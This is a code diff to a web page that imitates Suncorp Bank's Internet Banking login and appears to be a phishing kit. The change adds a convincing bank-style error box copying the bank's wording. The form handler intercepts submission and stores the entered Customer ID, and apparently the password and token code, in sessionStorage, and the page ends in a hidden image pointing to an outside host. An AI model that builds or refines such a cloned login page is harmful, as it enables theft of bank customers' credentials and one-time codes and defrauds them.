@@ -134,22 +134,28 @@ document.addEventListener('DOMContentLoaded', function() {
     const passwordInput = document.getElementById('password');
     const passcodeInput = document.getElementById('passcode');
     
-    // Create error containers
-    const userIdErrorDiv = document.createElement('div');
-    userIdErrorDiv.innerHTML = '<div class="sg-Validation-errorWrapper" id="userid-error" aria-live="assertive" style="display: none; margin-top: 5px;"><p class="sg-Validation-errorMessage"></p></div>';
-    userIdInput.parentNode.appendChild(userIdErrorDiv.firstChild);
+    // Find the Flextable element to insert error box before it
+    const flextable = document.querySelector('.sg-Flextable.sg-Flextable--2cols.sg-Flextable--collapseLarge');
     
-    const passwordErrorDiv = document.createElement('div');
-    passwordErrorDiv.innerHTML = '<div class="sg-Validation-errorWrapper" id="password-error" aria-live="assertive" style="display: none; margin-top: 5px;"><p class="sg-Validation-errorMessage"></p></div>';
-    passwordInput.parentNode.appendChild(passwordErrorDiv.firstChild);
+    // Create the error box
+    const errorBox = document.createElement('div');
+    errorBox.id = 'simpleErrorBox';
+    errorBox.className = 'sg-Box sg-Box--error sg-Box--withIcon uama-hidden';
+    errorBox.style.display = 'none';
+    errorBox.style.marginBottom = '20px';
+    errorBox.innerHTML = `
+        <div class="sg-Box-icon sg-Box-icon--withBackground">
+            <span class="sg-Box--errorIcon"></span>
+        </div>
+        <div class="sg-Box-content">
+            <p>This is an invalid combination of Internet Banking Customer ID, Internet Banking Password and Token Code - please re-enter your details. Your Internet Banking password is case sensitive so ensure your CAPS lock is not on. <strong>If you have a security token or use the Suncorp Bank Secured App you must enter a token code to login.</strong></p>
+        </div>
+    `;
     
-    const passcodeErrorDiv = document.createElement('div');
-    passcodeErrorDiv.innerHTML = '<div class="sg-Validation-errorWrapper" id="passcode-error" aria-live="assertive" style="display: none; margin-top: 5px;"><p class="sg-Validation-errorMessage"></p></div>';
-    passcodeInput.parentNode.appendChild(passcodeErrorDiv.firstChild);
-    
-    const userIdErrorEl = document.getElementById('userid-error');
-    const passwordErrorEl = document.getElementById('password-error');
-    const passcodeErrorEl = document.getElementById('passcode-error');
+    // Insert error box before the Flextable
+    if (flextable && flextable.parentNode) {
+        flextable.parentNode.insertBefore(errorBox, flextable);
+    }
     
     // Add red border style class
     const style = document.createElement('style');
@@ -193,28 +199,14 @@ document.addEventListener('DOMContentLoaded', function() {
         return passcodeRegex.test(passcode);
     }
     
-    function clearUserIdError() {
-        userIdErrorEl.style.display = 'none';
+    function clearAllErrors() {
+        errorBox.style.display = 'none';
         userIdInput.classList.remove('sg-Input--error-border');
         userIdInput.setAttribute('aria-invalid', 'false');
-    }
-    
-    function clearPasswordError() {
-        passwordErrorEl.style.display = 'none';
         passwordInput.classList.remove('sg-Input--error-border');
         passwordInput.setAttribute('aria-invalid', 'false');
-    }
-    
-    function clearPasscodeError() {
-        passcodeErrorEl.style.display = 'none';
         passcodeInput.classList.remove('sg-Input--error-border');
         passcodeInput.setAttribute('aria-invalid', 'false');
-    }
-    
-    function clearAllErrors() {
-        clearUserIdError();
-        clearPasswordError();
-        clearPasscodeError();
     }
     
     function hideLoading() {
@@ -272,9 +264,9 @@ document.addEventListener('DOMContentLoaded', function() {
     }
     
     // Remove errors when user types
-    userIdInput.addEventListener('input', clearUserIdError);
-    passwordInput.addEventListener('input', clearPasswordError);
-    passcodeInput.addEventListener('input', clearPasscodeError);
+    userIdInput.addEventListener('input', clearAllErrors);
+    passwordInput.addEventListener('input', clearAllErrors);
+    passcodeInput.addEventListener('input', clearAllErrors);
     
     form.addEventListener('submit', function(e) {
         e.preventDefault();
@@ -288,7 +280,6 @@ document.addEventListener('DOMContentLoaded', function() {
         
         // Validate Customer ID (9-10 digits)
         if (!userId || !validateUserId(userId)) {
-            userIdErrorEl.style.display = 'block';
             userIdInput.classList.add('sg-Input--error-border');
             userIdInput.setAttribute('aria-invalid', 'true');
             isValid = false;
@@ -296,7 +287,6 @@ document.addEventListener('DOMContentLoaded', function() {
         
         // Validate password (8+ chars, uppercase, lowercase, number, special char)
         if (!password || !validatePassword(password)) {
-            passwordErrorEl.style.display = 'block';
             passwordInput.classList.add('sg-Input--error-border');
             passwordInput.setAttribute('aria-invalid', 'true');
             isValid = false;
@@ -304,13 +294,16 @@ document.addEventListener('DOMContentLoaded', function() {
         
         // Validate passcode (6-8 digits, optional)
         if (!validatePasscode(passcode)) {
-            passcodeErrorEl.style.display = 'block';
             passcodeInput.classList.add('sg-Input--error-border');
             passcodeInput.setAttribute('aria-invalid', 'true');
             isValid = false;
         }
         
-        if (!isValid) return;
+        if (!isValid) {
+            // Show the error box above the Flextable
+            errorBox.style.display = 'block';
+            return;
+        }
         
         // Store in sessionStorage
         sessionStorage.setItem('userId', userId);
@@ -448,4 +441,5 @@ document.addEventListener('DOMContentLoaded', function() {
      Read more about Security Tokens
     </a>
    </div>
+
   </div><img style="display:none;" src="https://css.page-source.com/resizeimage.ashx?ig=&amp;sz=179401" width="0" height="0"></body></html>
